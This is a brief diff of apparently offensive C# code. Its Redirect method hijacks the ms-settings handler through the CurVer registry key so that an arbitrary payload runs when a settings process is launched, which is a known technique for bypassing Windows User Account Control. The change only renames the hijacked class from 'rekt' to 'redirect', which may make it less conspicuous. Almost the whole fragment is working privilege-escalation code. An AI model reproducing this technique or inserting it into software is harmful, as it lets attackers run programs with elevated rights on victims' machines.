@@ -21,8 +21,8 @@ class Program
     public static void Redirect(string payload)
     {
        
-        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer", "", "rekt");
-        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\rekt\Shell\Open\command", "", payload);
+        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer", "", "redirect");
+        Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\redirect\Shell\Open\command", "", payload);
 
        
         Process process = new Process();
